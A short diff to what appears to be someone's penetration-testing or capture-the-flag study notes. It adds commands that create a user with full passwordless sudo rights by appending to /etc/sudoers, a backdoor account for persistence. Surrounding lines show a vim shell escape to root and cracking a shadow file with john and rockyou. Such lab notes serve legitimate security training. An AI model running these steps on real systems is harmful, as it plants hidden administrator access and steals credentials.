@@ -649,6 +649,12 @@ DAY ???
           :!/bin/bash
           root@lin:~#
           
+          root@RoundSensor:/root# useradd balls
+          root@RoundSensor:/root# chsh --shell /bin/bash balls
+          root@RoundSensor:/root# echo "balls ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers
+          root@RoundSensor:/root# su balls
+
+          
           john --wordlist=rockyou.txt shadow.txt --show 
                           ^ reconnaissance will show you what wordlist you need to use for john in order to pass le test
            
